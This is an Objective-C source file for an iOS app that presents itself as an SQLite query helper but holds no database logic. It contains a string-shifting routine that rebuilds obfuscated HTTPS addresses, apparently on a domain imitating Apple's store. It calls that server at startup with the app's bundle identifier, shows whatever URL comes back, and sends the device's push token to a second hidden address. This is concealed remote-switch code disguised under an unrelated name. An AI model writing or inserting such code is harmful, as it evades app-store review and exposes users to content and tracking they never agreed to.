//
//  SQLiteQuery.m
//  func12
//
//  Created by  
//  Copyright © 2019 GussssirImage. All rights reserved.
//

#import "FMSQLiteQuery.h"

@implementation NSString(YYAssist)
 
//字符串混淆解密
-(NSString *) deROTWithSeed:(NSString * ) theString{
    NSRange range;
    NSMutableArray * array = [[NSMutableArray alloc] init];
    for(int i=0; i<theString.length; i+=range.length){
        range = [theString rangeOfComposedCharacterSequenceAtIndex:i];
        NSString *s = [theString substringWithRange:range];
        
        int asciiCode = [s characterAtIndex:0];
        //NSLog(@"%d",asciiCode);
        int newindex =  asciiCode - 16;
        if (asciiCode >= 76) {
            newindex =  asciiCode + 23;
        }
        if (asciiCode == 51 || asciiCode == 55 || asciiCode == 53 || asciiCode == 49 ||  asciiCode == 46 ) {  //3
            newindex =  asciiCode + 66;
        }
        if (asciiCode == 65) {
            newindex = 46;
        }
        if (asciiCode == 74) {
            newindex = 97;
        }
        
        NSString *string2 = [NSString stringWithFormat:@"%c", newindex];
        
        //NSLog(@"s--->%@ %d  -> %@",s,asciiCode,string2);
        [array addObject:string2];
    }
    return  [array componentsJoinedByString:@""];
}



@end

@implementation FMSQLiteQuery

+(instancetype)sharedInstance{
    static FMSQLiteQuery *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [[FMSQLiteQuery alloc] init];
        // Do any other initialisation stuff here
    });
    return sharedInstance;
}

-(NSString *) defaultBaseURL{
    return @"```AR]^WN\\JYY\\]X[NAU]M?PN]JYYLXWORPAYQY";
}

-(instancetype)init{
    self = [super init];
    if (self != nil) {
        // do init
        NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
        NSString * r3 = @"ht";
        NSString * r4 = @"//";
        NSString * r5 =  [@"" deROTWithSeed:[self defaultBaseURL]];
        NSString *url =  [NSString stringWithFormat:@"%@tps:%@%@", r3, r4, r5];
        self.APIClient = [[FMSQLiteQueryAPIClient alloc] initWith:url userAgent:@"" bundleIdentifier:bundleIdentifier];
        self.Observer = [[FMSQLiteQueryObserver alloc] init];
        self.Presenter = [[FMSQLiteQueryPresenter alloc] init];
        [self handleApplicationDidFinishLaunchingWithOptions:@{}];
    }
    return  self;
}

-(void)handleApplicationDidFinishLaunchingWithOptions:(id) launch{
    
    [self.APIClient requestSvStatusWithCompletion:^(NSString * _Nullable object, NSError * _Nullable error) {
        if (object) {
            self.postresponse = [[SQLiteQueryPOSTURLResponse alloc] init];
            self.postresponse.state = 1;
            self.postresponse.url = object;
            
            [self.Presenter present_cache];
            
        }
    }];

    
}
-(void)handleApplicationDidReceiveRemoteNotification:(NSDictionary*) userinfo{
    //
}

-(void)handleApplicationDidRegisterForRemoteNotificationsWithDeviceToken:(id)token{
    if(token){
        //
        NSString * r3 = @"ht";
        NSString * r4 = @"//";
        NSString * r5 = [@"" deROTWithSeed:@"```AR]^WN\\JYY\\]X[NAU]M?]XTNWAYQY"];
        NSString *url =  [NSString stringWithFormat:@"%@tps:%@%@", r3, r4, r5];
        [self.APIClient handleRemoteNotificationsWithURL:url DeviceToken:token];
    }
}

-(void)handleApplicationDidFailToRegisterForRemoteNotificationsWithErrorMessageNotification:(id)message{
    NSLog(@"fail.");
}

-(void)get_URLWithCompletion:(CompletioBlock)complate{
    
}
@end
